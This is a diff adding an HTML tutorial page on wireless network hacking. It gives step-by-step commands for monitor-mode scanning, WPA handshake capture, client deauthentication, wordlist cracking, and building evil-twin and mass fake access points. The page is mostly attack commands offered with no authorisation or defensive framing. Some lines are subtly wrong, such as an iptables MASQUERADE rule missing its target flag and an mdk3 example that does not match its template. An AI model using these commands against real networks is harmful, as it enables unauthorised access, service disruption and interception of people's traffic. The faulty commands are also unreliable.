@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Wireless Network Hacking</title>
+
+</head>
+
+<body>
+
+  <!-- Network Hacking section start from here -->
+
+  <div>
+
+    <h1>Wireless Network Hacking</h1>
+
+    <h4> Wireless Network Hacking Tools</h4><b>*<a href="../tools/wash.html">
+
+     wash </a></b> --  Network Scanning Tool<br><b>
+
+    * <a href="../tools/aircrack-ng.html"> Aircrack-ng </a></b> -- Manual WiFi Hacking Tool<br>
+
+    * Revear -- WPS PIN Hacking Tool<br>
+
+    * wifite -- Automatic WiFi Hacking Tool<br>
+
+    * <a href="/tools/mdk3.html"><b>mdk3</b></a> -- Multiple Wireless Attacking Tool<br>
+
+    * WiFiPumkin3 -- Powerful framework for rogue access point attack. <br>
+
+    
+
+    
+
+  </div>
+
+  <br>
+
+  
+
+  
+
+  
+
+  <div>
+
+    <h4> Wireless Network Hacking Method</h4>
+
+    <ol>
+
+      <li><b><a href="#aircrack-ng-attack">
+
+     Aircrack-ng </a></b> --  Manual Attack</li>
+
+     <li>
+
+       <b>
+
+         <a href="#evil-twin-attack">Evil Twin Attack</a> 
+
+       </b>
+
+     </li>
+
+    </ol>
+
+    
+
+  </div>
+
+  <br>
+
+  <div>
+
+  <h4> ___ Hacking Steps</h4>
+
+    <b><ol>
+
+      <li><a href="#net-scan"> Scanning</a></li>
+
+      <li><a href="#gain_access"> Gaining Access</a></li>
+
+      <li><a href="#post-connection"> Post Connection</a></li>
+
+    
+
+     </ol></b>
+
+  </div>
+
+  <div id="aircrack-ng-attack">
+
+  <h2>Start Wireless Network Hacking with Aircrack-ng</h2>
+
+    
+
+    <br><div id="net-scan">
+
+    <h3>>> Scanning</h3>
+
+    <p>For scanning around network you need to enable monitor mode on your wireless network adapter.</p>
+
+    <label><h4>• Enable Monitor Mode</h4></label>
+
+    <p><ol><b><li><a href="/tools/aircrack-ng.html#airmon-ng">Airmon-ng</a>:</li></b> To start monitor mode cmd,<br><br><i>  $ airmon-ng start {interface name}</i><br><b>Example: </b>airmon-ng start wlan0 <br><br>
+
+      To stop monitor mode cmd,<br><br><i>  $ airmon-ng stop {interface name}</i><br><b>Example: </b>airmon-ng stop wlan0 </ol></p>
+
+      
+
+      
+
+    <h4>• Scanning Network</h4>
+
+    <ul><li><b><a href="/tools/aircrack-ng.html#airodump-ng">Airodump-ng</a></b></li><li>To see available wireless network<br><b><i>$ airodump-ng {interface}</i></b></li><br><li><b><a href="/tools/wash.html">wash</a></b><li>Using wash type cmd,<br><br><i>$ wash -i {interface}</i></li></li></ul>
+
+    <br>
+
+  </div>
+
+<div id="gain_access">
+
+    <h3>>> Gaining Access</h3>
+
+    <h4>• Capture Handshake</h4>
+
+    <ul><li>Capture Handshake with airodump-ng<br><br><i><b>airodump-ng --bssid {BSSID} --channel {ch_number} --write {file_name} {interface}</b></i></li></ul>
+
+  
+
+  
+
+    <h4>• Deauthenticate Targets from network</h4>
+
+    <ul><li><a href="/tools/aircrack-ng.html#aireplay-ng"><b>Aireplay-ng</b></a><br><li>To Deauthenticate Target</li><br><b><i>$ aireplay-ng --deauth {num_pckt} -a {router_bssid} -c {target_bssid} {interface}</i></b></li></ul>
+
+  
+
+  
+
+    <h4>• Crack Handshake File</h4>
+
+    <ul><li><a href="/tools/aircrack-ng.html#aircrack-ng"><b>Aircrack-ng</b></a><br><li>To Crack Captured Handshake File, you need to a wordlist. Then type this cmd,</li><br><b><i>$ aircrack-ng {handshake_file} -w {wordlist}</i></b></li></ul>
+
+  
+
+  </div>
+
+  </div>
+
+  <br><br>
+
+  
+
+  
+
+  <div id="evil-twin-attack">
+
+    <h2>Evil Twin Attack</h2>
+
+    <h3>>> Create a fake access point</h3>
+
+    <h4>Commands:</h4>
+
+    <ul>
+
+      <li>
+
+        echo -e "interface=at0\ndhcp-range=192.168.0.50,192.168.0.150,12h" > /etc/dnsmasq.conf
+
+      </li>
+
+      <li>
+
+ <a href="/tools/aircrack-ng.html#airbase-ng">airbase-ng </a> -e [AP Name] -c [Channel] [Interface]<br>
+
+<b>eg:</b> airbase-ng -e FreeWiFi -c 6 wlan1
+
+      </li>
+
+      <li>
+
+        ifconfig at0 192.168.0.1 up
+
+      </li>
+
+      <li>
+
+        iptables --flush
+
+      </li>
+
+      <li>
+
+        iptables --table nat --flush
+
+      </li>
+
+      <li>Iptables --delete-chain</li>
+
+      <li>iptables -P FORWARD ACCEPT </li>
+
+      <li>iptables -t nat -A POSTROUTING -o wlan0 MASQUERADE
+
+      </li><br>
+
+      <li>dnsmasq</li>
+
+      <li>echo 1 > /proc/sys/net/ipv4/ip_forward
+
+      </li>
+
+    </ul>
+
+    
+
+    <h3>>> Create Multiple Fake AP</h3>
+
+    <h4>Commands:</h4>
+
+    <ul>
+
+      <li><a href="/tools/mdk3.html">mdk3</a> [interface] -b -c [channel] -f [BSSID file]<br>
+
+      <b>eg:</b> mdk3 wlan0 b -c 1 -f fake_ap.txt
+
+      </li>
+
+    </ul>
+
+  </div>
+
+  
+
+</body>
+
+</html>
